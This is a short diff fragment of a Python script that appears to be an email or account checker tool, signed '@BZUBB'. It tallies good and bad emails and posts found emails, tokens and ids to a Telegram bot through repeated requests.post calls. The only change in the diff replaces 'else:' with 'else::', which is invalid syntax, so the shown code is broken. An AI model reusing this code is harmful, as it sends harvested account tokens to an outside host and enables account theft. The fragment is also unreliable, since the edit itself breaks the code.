@@ -150,7 +150,7 @@ PY // @BZUBB '''
          		requests.post(f'https://api.telegram.org/bot{to}/sendMessage?chat_id={I}&text=\n{er}')
          		requests.post(f'https://api.telegram.org/bot{to}/sendMessage?chat_id={I}&text={token}')
            requests.post(f'https://api.telegram.org/bot{to}/sendMessage?chat_id={I}&text={id}')
-         	else:
+         	else::
          		ng+=1
          		os.system('cls'if os.name=='nt'else'clear')
          		print(f"{F} GOD EMAIL {X}: {F}{ag}{F}\n {Z}GOD TIK  {X}:{Z} {nt}\n{Z} BAD GMAIL : {Z}{ng}\n{C} Email : {email}\n----------------------------\n{B} PY // @BZUBB ")
